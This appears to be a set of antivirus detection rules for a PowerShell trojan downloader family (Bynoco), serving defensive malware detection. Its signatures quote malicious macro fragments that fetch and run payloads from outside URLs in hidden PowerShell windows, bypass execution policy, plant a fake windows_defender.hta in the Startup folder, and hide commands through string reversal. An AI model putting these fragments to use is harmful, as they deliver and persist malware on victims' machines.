
rule TrojanDownloader_PowerShell_Bynoco_MTB{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {77 65 72 73 68 65 6c 6c 20 22 20 26 20 22 28 4e 45 77 2d 6f 62 6a 45 22 20 26 20 6c 6c 6c 20 26 20 22 74 20 22 20 26 20 22 73 79 73 74 65 6d 2e 6e 65 74 2e 77 45 42 63 6c 49 65 6e 54 29 2e 44 6f 77 6e 4c 6f 41 64 66 49 6c 45 } //1 wershell " & "(NEw-objE" & lll & "t " & "system.net.wEBclIenT).DownLoAdfIlE
		$a_01_1 = {68 74 74 70 73 3a 2f 2f 63 2e 74 6f 70 34 74 6f 70 2e 69 6f 2f 70 5f 31 37 35 32 69 32 72 7a 7a 31 2e 6a 70 67 } //1 https://c.top4top.io/p_1752i2rzz1.jpg
		$a_01_2 = {45 4e 76 3a 54 45 4d 50 5c 76 68 66 2e 76 62 73 } //1 ENv:TEMP\vhf.vbs
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_2{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 78 48 74 74 70 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50 22 29 } //1 Set xHttp = CreateObject("Microsoft.XMLHTTP")
		$a_01_1 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 31 37 32 2e 31 36 2e 37 30 2e 31 30 2f 70 73 31 5f 62 36 34 2e 63 72 74 22 2c 20 46 61 6c 73 65 } //1 xHttp.Open "GET", "http://172.16.70.10/ps1_b64.crt", False
		$a_01_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 65 6e 63 6f 64 65 64 5f 70 73 31 2e 63 72 74 22 } //1 .savetofile "encoded_ps1.crt"
		$a_01_3 = {53 68 65 6c 6c 20 28 } //1 Shell (
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_3{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 50 6f 77 65 72 53 68 65 6c 6c 20 2d 6e 6f 6c 6f 67 6f 20 2d 6e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 77 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e 20 2d 43 6f 6d 6d 61 6e 64 } //1 = "PowerShell -nologo -noninteractive -windowStyle hidden -Command
		$a_01_1 = {28 4e 65 77 2d 4f 62 6a 65 63 74 20 53 79 73 74 65 6d 2e 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 } //1 (New-Object System.Net.WebClient).Downloadstring
		$a_01_2 = {68 74 74 70 73 3a 2f 2f 69 70 6c 6f 67 67 27 2c 27 65 72 2e 6f 72 67 2f 32 6f 76 41 39 33 } //1 https://iplogg','er.org/2ovA93
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_4{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {4e 65 74 2e 57 65 62 63 4c 60 49 45 4e 74 29 2e 28 27 44 6f 77 6e 27 2b 27 6c 6f 61 64 46 69 6c 65 27 29 2e 22 49 6e 76 6f 6b 65 } //1 Net.WebcL`IENt).('Down'+'loadFile')."Invoke
		$a_01_1 = {74 74 70 73 3a 2f 2f 74 69 6e 79 75 72 6c 2e 63 6f 6d 2f 79 33 70 77 73 79 33 73 27 2c 27 61 6e 2e 65 78 65 } //1 ttps://tinyurl.com/y3pwsy3s','an.exe
		$a_01_2 = {73 74 41 52 74 60 2d 73 6c 45 60 45 70 20 32 30 3b 20 4d 6f 76 65 2d 49 74 65 6d 20 22 61 6e 2e 65 78 65 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 24 7b 65 6e 56 60 3a 61 70 70 64 61 74 61 7d } //1 stARt`-slE`Ep 20; Move-Item "an.exe" -Destination "${enV`:appdata}
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_5{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 } //1 powershell.exe -WindowStyle Hidden -ExecutionPolicy
		$a_03_1 = {68 74 74 70 3a 2f 2f 77 65 65 73 68 6f 70 70 69 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 49 44 33 2f [0-04] 2f [0-08] 2e 6a 70 67 } //1
		$a_01_2 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 61 64 6c 68 76 6d 63 2e 65 78 65 } //3 Start-Process -FilePath "C:\Users\Public\adlhvmc.exe
		$a_01_3 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 6a 61 65 63 79 79 76 2e 65 78 65 } //3 Start-Process -FilePath "C:\Users\Public\Documents\jaecyyv.exe
		$a_01_4 = {53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 6c 76 6d 69 73 61 70 2e 65 78 65 } //3 Start-Process -FilePath "C:\Users\Public\Documents\lvmisap.exe
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*3+(#a_01_3  & 1)*3+(#a_01_4  & 1)*3) >=5
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_6{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 68 72 28 38 30 29 20 2b 20 43 68 72 28 37 39 29 20 2b 20 22 57 22 20 2b 20 22 45 22 20 2b 20 22 72 22 20 2b 20 22 73 68 65 6c 6c 22 } //1 = Chr(80) + Chr(79) + "W" + "E" + "r" + "shell"
		$a_01_1 = {2d 65 70 20 62 79 70 61 73 73 20 2d 43 6f 6d 6d 61 6e 64 20 22 22 22 20 2b 20 43 6d 64 20 2b 20 22 20 27 22 20 2b 20 75 72 69 20 2b 20 22 27 20 2d 4f 75 74 46 69 6c 65 20 27 22 20 2b 20 66 69 6c 65 5f 62 61 74 5f 63 6f 6d 70 6c 65 74 65 5f 70 61 74 68 20 2b 20 22 27 22 22 3b 20 2e 5c 22 20 2b 20 70 61 79 } //1 -ep bypass -Command """ + Cmd + " '" + uri + "' -OutFile '" + file_bat_complete_path + "'""; .\" + pay
		$a_01_2 = {3d 20 66 69 72 73 74 5f 6f 63 74 20 2b 20 22 2e 22 20 2b 20 73 65 63 6f 6e 64 5f 6f 63 74 20 2b 20 22 2e 22 20 2b 20 74 68 69 72 64 5f 6f 63 74 20 2b 20 22 2e 22 20 2b 20 66 6f 75 72 74 68 5f 6f 63 74 } //1 = first_oct + "." + second_oct + "." + third_oct + "." + fourth_oct
		$a_01_3 = {3d 20 53 68 65 6c 6c 28 22 63 22 20 2b 20 22 6d 22 20 2b 20 22 64 22 20 2b 20 22 20 2f 4b 20 22 20 2b 20 66 69 6c 65 5f 62 61 74 5f 63 6f 6d 70 6c 65 74 65 5f 70 61 74 68 2c 20 76 62 48 69 64 65 29 } //1 = Shell("c" + "m" + "d" + " /K " + file_bat_complete_path, vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_7{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {73 74 72 46 69 6c 65 45 78 69 73 74 73 20 3d 20 44 69 72 28 22 43 3a 5c 22 20 2b 20 22 5c 61 61 22 20 2b 20 22 61 5f 54 22 20 2b 20 22 6f 75 63 68 22 20 2b 20 22 4d 65 22 20 2b 20 22 4e 22 20 2b 20 22 6f 74 2e 74 78 74 22 29 } //1 strFileExists = Dir("C:\" + "\aa" + "a_T" + "ouch" + "Me" + "N" + "ot.txt")
		$a_01_1 = {43 61 6c 6c 20 47 65 74 4f 62 6a 65 63 74 28 53 74 72 52 65 76 65 72 73 65 28 22 73 73 22 20 2b 20 22 65 63 22 20 2b 20 22 6f 72 50 5f 22 20 2b 20 22 32 33 6e 69 57 22 20 2b 20 22 3a 32 22 20 2b 20 22 76 6d 69 22 20 2b 20 22 63 5c 74 22 20 2b 20 22 6f 6f 72 3a 22 20 2b 20 22 73 74 6d 22 20 2b 20 22 67 6d 22 20 2b 20 22 6e 22 20 2b 20 22 69 77 22 29 29 2e 20 5f } //1 Call GetObject(StrReverse("ss" + "ec" + "orP_" + "23niW" + ":2" + "vmi" + "c\t" + "oor:" + "stm" + "gm" + "n" + "iw")). _
		$a_01_2 = {43 72 65 61 74 65 28 53 74 72 52 65 76 65 72 73 65 28 22 3d } //1 Create(StrReverse("=
		$a_01_3 = {65 2d 20 6e 65 22 20 2b 20 22 64 64 69 22 20 2b 20 22 68 20 65 6c 79 22 20 2b 20 22 74 73 77 6f 64 6e 22 20 2b 20 22 69 77 2d 20 6c 22 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 68 65 6c 22 29 20 2b 20 22 73 72 22 20 2b 20 22 65 22 20 2b 20 22 77 22 20 2b 20 22 6f 70 22 29 } //1 e- ne" + "ddi" + "h ely" + "tswodn" + "iw- l" + StrReverse("hel") + "sr" + "e" + "w" + "op")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_8{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {44 69 72 28 22 43 3a 5c 55 73 65 72 73 5c 22 20 26 20 45 6e 76 69 72 6f 6e 28 22 75 73 65 72 6e 61 6d 65 22 29 20 26 20 22 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 77 69 6e 64 6f 77 73 5f 64 65 66 65 6e 64 65 72 2e 68 74 61 22 29 } //1 Dir("C:\Users\" & Environ("username") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_defender.hta")
		$a_01_1 = {3d 20 22 50 6f 77 65 72 53 68 65 6c 6c 20 2d 77 69 6e 64 6f 77 73 74 79 6c 65 20 68 69 64 64 65 6e 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 73 76 32 2e 73 32 75 2e 65 73 2f 65 78 70 6c 6f 69 74 2f 61 64 6a 75 6e 74 6f 2e 68 74 61 } //1 = "PowerShell -windowstyle hidden wget http://sv2.s2u.es/exploit/adjunto.hta
		$a_01_2 = {2d 4f 75 74 46 69 6c 65 20 22 22 22 22 22 22 43 3a 5c 55 73 65 72 73 5c 65 6e 61 63 68 65 72 5c 41 70 70 44 61 74 61 5c 52 6f 61 6d 69 6e 67 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 77 69 6e 64 6f 77 73 5f 64 65 66 65 6e 64 65 72 2e 68 74 61 22 22 22 22 22 22 22 } //1 -OutFile """"""C:\Users\enacher\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows_defender.hta"""""""
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}
rule TrojanDownloader_PowerShell_Bynoco_MTB_9{
	meta:
		description = "TrojanDownloader:PowerShell/Bynoco!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {73 74 72 46 69 6c 65 45 78 69 73 74 73 20 3d 20 44 69 72 28 22 43 3a 5c 22 20 2b 20 22 5c 61 61 22 20 2b 20 22 61 5f 54 22 20 2b 20 22 6f 75 63 68 22 20 2b 20 22 4d 65 22 20 2b 20 22 4e 22 20 2b 20 22 6f 74 5f 2e 74 78 74 22 29 } //1 strFileExists = Dir("C:\" + "\aa" + "a_T" + "ouch" + "Me" + "N" + "ot_.txt")
		$a_01_1 = {43 61 6c 6c 20 47 65 74 4f 62 6a 65 63 74 28 53 74 72 52 65 76 65 72 73 65 28 22 73 73 22 20 2b 20 22 65 63 22 20 2b 20 22 6f 22 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 5f 50 72 22 29 20 2b 20 22 32 33 6e 69 57 22 20 2b 20 22 3a 32 22 20 2b 20 22 76 6d 69 22 20 2b 20 22 63 5c 74 22 20 2b 20 22 6f 6f 72 3a 22 20 2b 20 22 73 74 6d 22 20 2b 20 22 67 6d 22 20 2b 20 22 6e 22 20 2b 20 22 69 77 22 29 29 2e 20 5f } //1 Call GetObject(StrReverse("ss" + "ec" + "o" + StrReverse("_Pr") + "23niW" + ":2" + "vmi" + "c\t" + "oor:" + "stm" + "gm" + "n" + "iw")). _
		$a_01_2 = {43 72 65 61 74 65 28 53 74 72 52 65 76 65 72 73 65 28 22 3d } //1 Create(StrReverse("=
		$a_01_3 = {65 2d 20 6e 65 22 20 2b 20 22 64 64 69 22 20 2b 20 22 68 20 65 6c 79 22 20 2b 20 22 74 73 77 6f 64 6e 22 20 2b 20 22 69 77 2d 20 6c 22 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 68 65 6c 22 29 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 22 72 73 22 29 20 2b 20 22 65 22 20 2b 20 22 77 22 20 2b 20 22 6f 70 22 29 } //1 e- ne" + "ddi" + "h ely" + "tswodn" + "iw- l" + StrReverse("hel") + StrReverse("rs") + "e" + "w" + "op")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}